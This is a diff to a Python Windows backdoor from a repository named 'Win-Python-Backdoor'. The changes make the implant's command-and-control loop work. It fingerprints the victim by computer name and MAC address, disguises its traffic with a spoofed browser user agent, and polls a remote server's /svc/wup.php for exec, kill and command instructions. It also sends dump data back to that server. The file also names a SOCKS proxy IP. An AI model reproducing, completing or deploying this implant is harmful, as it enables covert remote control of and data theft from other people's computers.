@@ -35,8 +35,8 @@ import requests
 
 #copy /y "%USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\wofficeie1.py" C:\Python27_64
 #copy /y "%USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\wofficeie1.py" C:\Python27
-#python "%USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\setupserie641.py" py2exe
-#python "%USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\setupserie1.py" py2exe
+#.\python "%USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\setupserie164.py" py2exe
+#.\python "%USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\setupserie1.py" py2exe
 def get_macaddress(host='localhost'):
     """ Returns the MAC address of a network host, requires >= WIN2K. """
     # http://aspn.activestate.com/ASPN/Cookbook/Python/Recipe/347812
@@ -165,8 +165,8 @@ def myloop():
                 ua = UserAgent()
                 #print(ua.chrome)
                 header = {'User-Agent':str(ua.chrome)}
+                #header = {'User-Agent': 'Mozilla/5.0'}
                 #print(header)
-                
                 mymac = get_mac()
                 smacaddress = get_macaddress('localhost')
                 sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress
@@ -175,16 +175,15 @@ def myloop():
                 #opener = urllib2.build_opener(SocksiPyHandler(socks.PROXY_TYPE_SOCKS4, '52.26.124.145', 8080))
                 #response = opener.open("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+sTime).read()
                 #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+sTime)#+"&dump=aaaaa")
-                
                 #httpServ.request('GET', "/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+sTime)
                 #response = httpServ.getresponse()
-                url = "/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+sTime
-                sresponse = requests.get(url, headers=header)
+                url = "http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+sTime
+                response = requests.get(url, headers=header)
                 #sresponse=response.read()
-                #if response.status == httplib.OK:
-                if sresponse!= '':
+                if response.status_code == 200:#httplib.OK:
+                #if sresponse!= '':
                         print "Output from HTML request"
-                        #sresponse = response.read()
+                        sresponse = response.text
                         ifind=sresponse.find('ip=')
                         sip = sresponse[ifind+3:sresponse.find('||',ifind)]
                         ifind=sresponse.find('port=')
@@ -207,12 +206,12 @@ def myloop():
                             site=site1
                         #httpServ.request('GET', "/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+sTime)
                         #response = httpServ.getresponse()
-                        url = "/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+sTime
-                        sresponse = requests.get(url, headers=header)
-                        if sresponse!= '':
-                        #if response.status == httplib.OK:
+                        url = "http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+sTime
+                        response = requests.get(url, headers=header)
+                        #if sresponse!= '':
+                        if response.status_code == 200:#httplib.OK:
                             print "Output from HTML request"
-                            #sresponse = response.read()
+                            sresponse = response.text
                             ifind=sresponse.find('ip=')
                             sip = sresponse[ifind+3:sresponse.find('||',ifind)]
                             ifind=sresponse.find('port=')
@@ -227,7 +226,7 @@ def myloop():
                             scmd = sresponse[ifind+4:sresponse.find('||',ifind)]
                             print skill
                         
-                #httpServ.close()
+                httpServ.close()
                 if sexec == '1':
                         sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress
                         try:
@@ -256,8 +255,8 @@ def myloop():
                                 #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&dump="+sdump)
                                 #httpServ.request('GET', "/svc/wup.php?pc="+sCOMPUTERNAME+"&dump="+sdump)
                                 #response = httpServ.getresponse()
-                                url = "/svc/wup.php?pc="+sCOMPUTERNAME+"&dump="+sdump
-                                sresponse = requests.get(url, headers=header)
+                                url = "http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&dump="+sdump
+                                response = requests.get(url, headers=header)
                                 #httpServ.close()
                                                                    
                             else:
@@ -281,8 +280,8 @@ def myloop():
                         #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&exec=0")
                         #httpServ.request('GET', "/svc/wup.php?pc="+sCOMPUTERNAME+"&exec=0")
                         #response = httpServ.getresponse()
-                        url = "/svc/wup.php?pc="+sCOMPUTERNAME+"&exec=0"
-                        sresponse = requests.get(url, headers=header)
+                        url = "http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&exec=0"
+                        response = requests.get(url, headers=header)
                         #httpServ.close()
                 if skill == '0':
                         try:
@@ -299,8 +298,8 @@ def myloop():
                         #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&kill=1")
                         #httpServ.request('GET', "/svc/wup.php?pc="+sCOMPUTERNAME+"&kill=1")
                         #response = httpServ.getresponse()
-                        url = "/svc/wup.php?pc="+sCOMPUTERNAME+"&kill=1"
-                        sresponse = requests.get(url, headers=header)
+                        url = "http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&kill=1"
+                        response = requests.get(url, headers=header)
                         #httpServ.close()
                         
 ##                                        client = paramiko.SSHClient()                                        
